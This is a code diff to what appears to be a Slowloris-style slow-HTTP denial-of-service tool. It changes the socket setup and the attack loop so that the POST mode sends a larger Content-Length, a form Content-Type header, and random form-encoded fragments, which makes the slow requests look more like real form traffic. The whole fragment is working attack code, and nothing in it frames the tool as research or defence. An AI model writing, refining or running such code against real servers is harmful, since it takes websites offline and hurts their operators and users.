@@ -48,7 +48,8 @@ def init_socket(mode, host, port, https, randuseragent):
         send_header(s, "Host", host)
         send_header(s, "User-Agent", ua)
         send_header(s, "Accept-language", "en-US,en,q=0.5")
-        send_header(s, "Content-Length", random.randint(1000, 5000))
+        send_header(s, "Content-Length", random.randint(4000, 5000))
+        send_header(s, "Content-Type", "application/x-www-form-urlencoded")
         send_line(s)
     return s
 
@@ -92,7 +93,7 @@ def attack(mode, host, port, sockets, sleeptime, https, randuseragent):
                     if mode == Mode.HEADER:
                         send_header(s, "X-a", random.randint(1, 5000))
                     elif mode == Mode.POST:
-                        send_utf8(s, random.choice(string.ascii_lowercase))
+                        send_utf8(s, ''.join(random.choices(string.ascii_letters, k=7)) + '=' + ''.join(random.choices(string.ascii_letters, k=3)) + '&')
                 except socket.error:
                     list_of_sockets.remove(s)
 
